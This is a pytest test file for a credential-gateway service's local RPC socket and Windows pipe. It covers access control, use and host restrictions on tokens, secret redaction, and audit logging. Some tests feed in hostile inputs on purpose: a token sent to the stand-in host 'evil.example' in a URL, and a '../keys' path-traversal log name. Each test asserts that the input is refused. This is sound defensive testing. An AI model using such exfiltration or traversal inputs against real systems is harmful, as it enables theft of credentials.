"""The gate service's gate.sock (gate-service-v0 §3): real server, real socket, real peer credentials."""

from __future__ import annotations

import json
import os
import socket
import stat
import subprocess
import threading
import time

import httpx
import pytest

from secret_gate.constants import KIND_TOTP, USE_EXEC, USE_FILL, USE_HTTP, USE_OTP
from secret_gate.errors import GateError
from secret_gate.keystore import load_public_key
from secret_gate.policy import SecretPayload
from secret_gate.rpc_client import RpcClient, ServiceUnavailable
from secret_gate.rpc_protocol import MAX_REQUEST_BYTES, RemoteError, decode_request, peer_uid
from secret_gate.rpc_server import prepare_socket_path
from secret_gate.tokens import make_token
from tests.fixtures import fake_secrets as fs
from tests.service_fixtures import running_service, short_dir

SCOPE = "rpc-scope-0123456789abcdefgh"
PASSWORD = fs.PORTAL.password


def _token(svc, *, value=PASSWORD, uses=(USE_HTTP,), hosts=fs.PORTAL.hosts, label="portal-a/pass", kind="secret", **kw):
    payload = SecretPayload.create(value=value, hosts=list(hosts), uses=set(uses), label=label, kind=kind, **kw)
    return make_token(load_public_key(svc.home), payload)


def _audit(svc) -> list[dict]:
    return [json.loads(line) for line in svc.audit.read_text().splitlines()]


@pytest.mark.posix
def test_peer_uid_is_the_kernels_record_of_the_other_end():
    a, b = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    with a, b:
        assert peer_uid(a) == os.getuid() == peer_uid(b)


@pytest.mark.posix
def test_socket_is_0666_and_only_allowed_uids_get_an_answer():
    with running_service() as svc:
        assert stat.S_IMODE(svc.socket.stat().st_mode) == 0o666
        assert svc.client.call("status")["version"]
    with running_service(allowed=frozenset({0})) as svc:                  # this test user is not allowed
        with pytest.raises(ServiceUnavailable, match="连接被关闭"):
            svc.client.call("status")
        assert not svc.audit.exists()                                     # refused before any request was read


def test_the_socket_answers_exactly_the_methods_of_gate_simple_v0():
    from secret_gate.rpc_methods import METHODS

    assert METHODS == ("status", "refs.register", "refs.release", "mcp.describe", "mcp.otp", "mcp.http",
                       "exec.resolve", "browser.register", "browser.config", "browser.resolve", "logs.tail")
    with running_service() as svc:
        assert svc.service.methods == METHODS
        for gone in ("keys.list", "keys.new", "keys.use", "keys.retire", "keys.restore", "credential.info",
                     "credential.reissue", "mcp.repair", "mcp.exec"):
            with pytest.raises(RemoteError, match="未知方法"):
                svc.client.call(gone, {})


def test_status_lists_the_one_key_as_published():
    with running_service() as svc:
        status = svc.client.call("status")
        assert status["proxyPort"] == 18080 and status["runtimeVersion"] == "0.1.0+test" and status["proxyRunning"]
        published = json.loads((svc.public / "keys.json").read_text())
        assert status["keys"] == published
        assert [(k["name"], k["current"], k["legacy"]) for k in published] == [("main", True, False)]
        assert published[0]["publicKey"] == (svc.home / "key.pub").read_text().strip()


def test_refs_register_and_release_match_the_cli_contract():
    with running_service() as svc:
        token = _token(svc)
        out = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token, {"token": token, "label": "ignored"}, "junk"]})
        first, second, bad = out["refs"]
        assert first["ref"].startswith("enc:ref:") and first["ref"] == second["ref"] and first["label"] == "portal-a/pass"
        assert bad == {"error": "not a token of this gate (malformed, tampered, or made for another gate)"}
        assert PASSWORD not in json.dumps(out)
        assert svc.client.call("refs.release", {"scope": SCOPE}) == {"released": 1}
        with pytest.raises(RemoteError, match="released"):
            svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})
        with pytest.raises(RemoteError, match="invalid execution scope"):
            svc.client.call("refs.release", {"scope": "short"})


def test_old_tokens_with_seed_import_hosts_still_open_and_the_field_is_ignored():
    from secret_gate.crypto import encrypt, b64url_encode
    from secret_gate.tokens import pad_plaintext

    with running_service() as svc:
        old = json.dumps({"v": fs.TOTP_SECRET_B32, "host": ["portal-a.example.com"], "use": ["otp"],
                          "label": "portal-a/totp", "kind": "totp", "seed_import_hosts": ["portal-a.example.com"]})
        token = "enc:v1:" + b64url_encode(encrypt(load_public_key(svc.home), pad_plaintext(old.encode())))
        info = svc.client.call("mcp.describe", {"token": token})
        assert info == {"label": "portal-a/totp", "kind": "totp", "hosts": ["portal-a.example.com"], "uses": ["otp"]}
        assert svc.client.call("mcp.otp", {"token": token}).isdigit()


def test_exec_resolve_hands_out_only_exec_tokens_and_audits_without_the_value():
    with running_service() as svc:
        exec_token = _token(svc, uses=(USE_EXEC,), hosts=(), label="db/pass")
        assert svc.client.call("exec.resolve", {"token": exec_token}) == {"value": PASSWORD, "label": "db/pass"}
        for uses in ((USE_HTTP,), (USE_FILL,), (USE_HTTP, USE_FILL)):
            with pytest.raises(RemoteError, match="does not allow use 'exec'"):
                svc.client.call("exec.resolve", {"token": _token(svc, uses=uses)})
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [exec_token]})["refs"][0]["ref"]
        assert svc.client.call("exec.resolve", {"scope": SCOPE, "token": ref})["value"] == PASSWORD
        with pytest.raises(RemoteError, match="no task scope"):
            svc.client.call("exec.resolve", {"token": ref})
        with pytest.raises(RemoteError, match="参数无效"):
            svc.client.call("exec.resolve", {"token": exec_token, "host": "x"})
        audit = svc.audit.read_text()
        assert PASSWORD not in audit and exec_token not in audit and SCOPE not in audit
        line = next(line for line in _audit(svc) if line["method"] == "exec.resolve" and line["ok"])
        assert line["labels"] == ["db/pass"]
        (svc.home / "logs" / "rpc.log").write_text(f"a library quoted {PASSWORD}\n")
        assert PASSWORD not in svc.client.call("logs.tail", {"name": "rpc"})["text"]   # handed out: redacted from logs


def test_mcp_methods_run_inside_the_service_and_redact():
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, text=f"hello {request.content.decode()}")

    client = httpx.Client(transport=httpx.MockTransport(handler))
    with running_service(http_client=lambda: client) as svc:
        token = _token(svc, uses=(USE_HTTP, USE_EXEC))
        assert svc.client.call("mcp.describe", {"token": token})["label"] == "portal-a/pass"
        out = svc.client.call("mcp.http", {"method": "POST", "url": "https://portal-a.example.com/login", "body": token})
        assert seen[0].content.decode() == PASSWORD                        # the site got the value
        assert out == {"status": 200, "headers": out["headers"], "body": "hello [REDACTED:portal-a/pass]"}
        with pytest.raises(RemoteError, match="not allowed on host"):
            svc.client.call("mcp.http", {"method": "GET", "url": f"https://evil.example/?p={token}"})
        totp = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp")
        assert svc.client.call("mcp.otp", {"token": totp}).isdigit()
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})["refs"][0]["ref"]
        assert svc.client.call("mcp.describe", {"scope": SCOPE, "token": ref})["ref"] == ref
        with pytest.raises(RemoteError, match="no task scope"):
            svc.client.call("mcp.describe", {"token": ref})
        audit = svc.audit.read_text()
        assert PASSWORD not in audit and token not in audit and SCOPE not in audit
        lines = _audit(svc)
        http_line = next(line for line in lines if line["method"] == "mcp.http" and line["ok"])
        assert http_line["labels"] == ["portal-a/pass"] and http_line["host"] == "portal-a.example.com"
        assert {"ts", "scope", "event", "method", "uid", "ok"} <= set(lines[0])


def test_mcp_http_transport_errors_name_the_failure_only():
    def handler(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError(f"cannot reach {request.url}")

    client = httpx.Client(transport=httpx.MockTransport(handler))
    with running_service(http_client=lambda: client) as svc:
        token = _token(svc)
        with pytest.raises(RemoteError) as exc:
            svc.client.call("mcp.http", {"method": "GET", "url": f"https://portal-a.example.com/?p={token}"})
        assert str(exc.value) == "request failed (ConnectError)" and PASSWORD not in str(exc.value)


def test_browser_resolve_is_fill_only_and_host_checked():
    with running_service() as svc:
        fill = _token(svc, uses=(USE_FILL,), label="portal-a/fill")
        http_only = _token(svc, uses=(USE_HTTP,))
        host = "login.portal-a.example.com:443"
        assert svc.client.call("browser.resolve", {"token": fill, "host": host}) == {"value": PASSWORD, "label": "portal-a/fill"}
        with pytest.raises(RemoteError, match="does not allow use 'fill'"):
            svc.client.call("browser.resolve", {"token": http_only, "host": host})
        with pytest.raises(RemoteError, match="not allowed on host"):
            svc.client.call("browser.resolve", {"token": fill, "host": "evil.example:443"})
        for bad in ("*.portal-a.example.com:443", "login.portal-a.example.com", "https://x/"):
            with pytest.raises(RemoteError, match="参数无效"):
                svc.client.call("browser.resolve", {"token": fill, "host": bad})
        ref = svc.client.call("browser.register", {"scope": SCOPE, "token": fill})["ref"]
        assert svc.client.call("browser.resolve", {"scope": SCOPE, "token": ref, "host": host})["value"] == PASSWORD
        line = next(line for line in _audit(svc) if line["method"] == "browser.resolve" and line["ok"])
        assert line["host"] == host and line["labels"] == ["portal-a/fill"] and PASSWORD not in svc.audit.read_text()


def test_browser_config_and_logs_tail():
    with running_service() as svc:
        assert svc.client.call("browser.config") == {"screenshotMask": None}
        mask = {"kinds": ["email"], "regions": {"a.example": [".card"]}}
        (svc.home / "screenshot-mask.json").write_text(json.dumps(mask))
        assert svc.client.call("browser.config") == {"screenshotMask": mask}
        (svc.home / "screenshot-mask.json").write_text(json.dumps({"bogus": 1}))
        with pytest.raises(RemoteError, match="screenshot-mask.json is invalid"):
            svc.client.call("browser.config")
        assert svc.client.call("logs.tail", {"name": "proxy"}) == {"text": ""}
        (svc.home / "logs").mkdir(exist_ok=True)
        (svc.home / "logs" / "rpc.log").write_text("".join(f"line {n}\n" for n in range(600)))
        assert svc.client.call("logs.tail", {"name": "rpc", "lines": 2}) == {"text": "line 598\nline 599"}
        for params in ({"name": "../keys"}, {"name": "rpc", "lines": 501}, {"name": "rpc", "lines": True}):
            with pytest.raises(RemoteError, match="参数无效"):
                svc.client.call("logs.tail", params)


@pytest.mark.posix
def test_protocol_errors_are_answered_in_chinese_and_the_connection_survives():
    with running_service() as svc, socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
        sock.connect(str(svc.socket))
        reader = sock.makefile("rb")
        for line, reason in ((b"not json\n", "有效的 JSON"), (b'{"id": 1}\n', "method"),
                             (b'{"id": 2, "method": "nope"}\n', "未知方法"), (b'{"id": 3, "method": "status", "params": []}\n', "params")):
            sock.sendall(line)
            reply = json.loads(reader.readline())
            assert reply["ok"] is False and reason in reply["error"]
        sock.sendall(b'{"id": 9, "method": "status"}\n')
        assert json.loads(reader.readline())["id"] == 9


@pytest.mark.posix
def test_requests_over_one_mebibyte_are_refused():
    with running_service() as svc, socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
        sock.connect(str(svc.socket))
        sock.sendall(b'{"id": 1, "method": "status", "params": {"x": "' + b"a" * MAX_REQUEST_BYTES + b'"}}\n')
        reply = json.loads(sock.makefile("rb").readline())
        assert reply == {"id": None, "ok": False, "error": "请求超过 1 MiB"}
    with pytest.raises(GateError, match="1 MiB"):
        RpcClient(svc.socket).call("status", {"x": "a" * MAX_REQUEST_BYTES})
    with pytest.raises(GateError, match="1 MiB"):
        decode_request(b"x" * (MAX_REQUEST_BYTES + 1))


def test_a_slow_call_does_not_hold_up_other_clients():
    release = threading.Event()
    started = threading.Event()

    def slow_site(_request: httpx.Request) -> httpx.Response:
        started.set()
        release.wait(10)
        return httpx.Response(200, text="done")

    client = httpx.Client(transport=httpx.MockTransport(slow_site))
    with running_service(http_client=lambda: client) as svc:
        results: list = []
        worker = threading.Thread(target=lambda: results.append(
            svc.client.call("mcp.http", {"method": "GET", "url": "https://portal-a.example.com/"})))
        worker.start()
        assert started.wait(5)
        began = time.monotonic()
        assert svc.client.call("status")["version"]                        # answered while the site is still slow
        assert time.monotonic() - began < 2 and not results
        release.set()
        worker.join(5)
        assert results[0]["body"] == "done"


@pytest.mark.posix
def test_stale_socket_is_replaced_but_a_live_one_or_a_file_is_not():
    with short_dir() as root:
        path = root / "gate.sock"
        stale = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        stale.bind(str(path))
        stale.close()                                                     # bound, nobody listening
        prepare_socket_path(path)
        assert not path.exists()
        path.write_text("not a socket")
        with pytest.raises(GateError, match="不是 socket"):
            prepare_socket_path(path)
    with running_service() as svc:
        with pytest.raises(GateError, match="已有服务"):
            prepare_socket_path(svc.socket)


def test_no_service_means_unavailable_never_a_local_fallback(tmp_path):
    with pytest.raises(ServiceUnavailable, match="凭据网关服务无响应"):
        RpcClient(tmp_path / "gate.sock").call("status")


@pytest.mark.posix
def test_secret_gate_rpc_process_end_to_end():
    """`secret-gate rpc` as launchd runs it: env only, config next to the public dir, SIGTERM removes the socket.
    A home without a keypair gets one at start (a fresh install; gate-simple-v0 §6)."""
    import signal
    import sys

    from secret_gate.service_paths import ServiceConfig

    with short_dir() as root:
        home, public = root / "gate", root / "gate-public"
        home.mkdir(mode=0o700)
        public.mkdir()
        config = ServiceConfig(owner_uid=os.getuid(), proxy_port=18081, runtime_version="t", installed_at="t")
        (root / "gate-service.json").write_text(json.dumps(config.to_json()))
        env = {**os.environ, "SECRET_GATE_HOME": str(home), "SECRET_GATE_PUBLIC": str(public)}
        proc = subprocess.Popen([sys.executable, "-m", "secret_gate.cli", "rpc"], env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            for _ in range(200):
                if (public / "gate.sock").exists():
                    break
                time.sleep(0.05)
            status = RpcClient(public / "gate.sock").call("status")
            assert status["proxyPort"] == 18081 and status["proxyRunning"] is False
            rows = json.loads((public / "keys.json").read_text())
            assert [r["name"] for r in rows] == ["main"] and rows[0]["publicKey"] == (home / "key.pub").read_text().strip()
            assert stat.S_IMODE((home / "key.priv").stat().st_mode) == 0o600
        finally:
            proc.send_signal(signal.SIGTERM)
            _, err = proc.communicate(timeout=10)
        assert proc.returncode == 0, err
        assert not (public / "gate.sock").exists()
        assert b"listening on" in err and b"generated one" in err


def test_allowed_uids_come_from_gate_service_json(tmp_path, capsys):
    from secret_gate.rpc_server import config_loader, owner_uids
    from secret_gate.service_paths import ServiceConfig

    path = tmp_path / "gate-service.json"
    assert owner_uids(config_loader(path))() == frozenset({0})             # missing: root only
    assert "gate-service.json" in capsys.readouterr().err
    path.write_text(json.dumps(ServiceConfig(501, 8080, "v", "t").to_json()))
    assert owner_uids(config_loader(path))() == frozenset({0, 501})
    path.write_text(json.dumps({"ownerUid": 501}))
    assert owner_uids(config_loader(path))() == frozenset({0})             # invalid: root only


# -- Windows: the same service on a named pipe (gate-simple-v0 §5) -----------------------------------------------------

@pytest.mark.windows
def test_pipe_only_allowed_sids_get_an_answer():
    from secret_gate.fsacl import SYSTEM_SID

    with running_service() as svc:
        assert svc.client.call("status")["version"]
        assert _audit(svc)[0]["sid"] == svc.service._config().owner_sid
    with running_service(allowed=frozenset({SYSTEM_SID})) as svc:          # this test user is not allowed
        with pytest.raises(ServiceUnavailable, match="连接被关闭"):
            svc.client.call("status")
        assert not svc.audit.exists()                                     # refused before any request was answered


@pytest.mark.windows
def test_pipe_protocol_errors_and_large_requests():
    from secret_gate.winpipe import connect

    with running_service() as svc:
        stream = connect(svc.socket, 5)
        try:
            for line, reason in ((b"not json\n", "有效的 JSON"), (b'{"id": 1}\n', "method"),
                                 (b'{"id": 2, "method": "nope"}\n', "未知方法")):
                stream.sendall(line)
                reply = json.loads(stream.readline(1 << 20))
                assert reply["ok"] is False and reason in reply["error"]
            stream.sendall(b'{"id": 9, "method": "status"}\n')
            assert json.loads(stream.readline(1 << 20))["id"] == 9
        finally:
            stream.close()
        stream = connect(svc.socket, 5)
        try:
            stream.sendall(b'{"id": 1, "method": "status", "params": {"x": "' + b"a" * MAX_REQUEST_BYTES + b'"}}\n')
            assert json.loads(stream.readline(1 << 20)) == {"id": None, "ok": False, "error": "请求超过 1 MiB"}
        finally:
            stream.close()


@pytest.mark.windows
def test_pipe_client_refuses_a_pipe_someone_else_made():
    """The client checks who created the pipe before sending anything (a squatter cannot pass for the service)."""
    from secret_gate.fsacl import GATE_SERVICE_SID
    from secret_gate.winpipe import connect

    with running_service() as svc:
        with pytest.raises(OSError, match="not created by the gate service account"):
            connect(svc.socket, 5, expected_owner=GATE_SERVICE_SID)
        (svc.root / "gate-service.json").write_text("{}")                 # service mode: only the service's pipe
        with pytest.raises(ServiceUnavailable, match="not created by the gate service account"):
            svc.client.call("status")


@pytest.mark.windows
def test_pipe_name_is_claimed_once():
    from secret_gate.rpc_methods import GateService
    from secret_gate.rpc_server import PipeRpcServer

    with running_service() as svc:
        with pytest.raises(OSError, match="already exists"):
            PipeRpcServer(svc.socket, GateService(svc.home, svc.public, lambda: None), lambda: frozenset(), None)


@pytest.mark.windows
def test_secret_gate_rpc_process_end_to_end_on_windows():
    """`secret-gate rpc` as the Windows service host runs it: env only, config next to the public dir, a pipe."""
    import sys

    from secret_gate.fsacl import current_user_sid
    from secret_gate.service_paths import ServiceConfig
    from secret_gate.winpipe import connect

    with short_dir() as root:
        home, public = root / "gate", root / "gate-public"
        home.mkdir()
        public.mkdir()
        config = ServiceConfig(owner_uid=None, owner_sid=current_user_sid(), proxy_port=18081, runtime_version="t",
                               installed_at="t")
        (root / "gate-service.json").write_text(json.dumps(config.to_json()))
        env = {**os.environ, "SECRET_GATE_HOME": str(home), "SECRET_GATE_PUBLIC": str(public)}
        proc = subprocess.Popen([sys.executable, "-m", "secret_gate.cli", "rpc"], env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            stream = None
            for _ in range(200):
                try:
                    stream = connect(public / "gate.sock", 5, expected_owner=current_user_sid())
                    break
                except OSError:
                    time.sleep(0.05)
            assert stream is not None
            try:
                stream.sendall(b'{"id": 1, "method": "status"}\n')
                status = json.loads(stream.readline(1 << 20))["result"]
            finally:
                stream.close()
            assert status["proxyPort"] == 18081 and status["proxyRunning"] is False
            rows = json.loads((public / "keys.json").read_text())
            assert [r["name"] for r in rows] == ["main"] and rows[0]["publicKey"] == (home / "key.pub").read_text().strip()
        finally:
            proc.terminate()
            _, err = proc.communicate(timeout=10)
        assert b"listening on" in err and b"generated one" in err


def test_allowed_sids_come_from_gate_service_json(tmp_path, capsys):
    from secret_gate.fsacl import SYSTEM_SID
    from secret_gate.rpc_server import config_loader, owner_sids
    from secret_gate.service_paths import ServiceConfig

    path = tmp_path / "gate-service.json"
    assert owner_sids(config_loader(path))() == frozenset({SYSTEM_SID})   # missing: SYSTEM only
    sid = "S-1-5-21-1004336348-1177238915-682003330-1001"
    path.write_text(json.dumps(ServiceConfig(None, 8080, "v", "t", owner_sid=sid).to_json()))
    assert owner_sids(config_loader(path))() == frozenset({SYSTEM_SID, sid})
    path.write_text(json.dumps(ServiceConfig(501, 8080, "v", "t").to_json()))
    assert owner_sids(config_loader(path))() == frozenset({SYSTEM_SID})   # a POSIX config names no SID
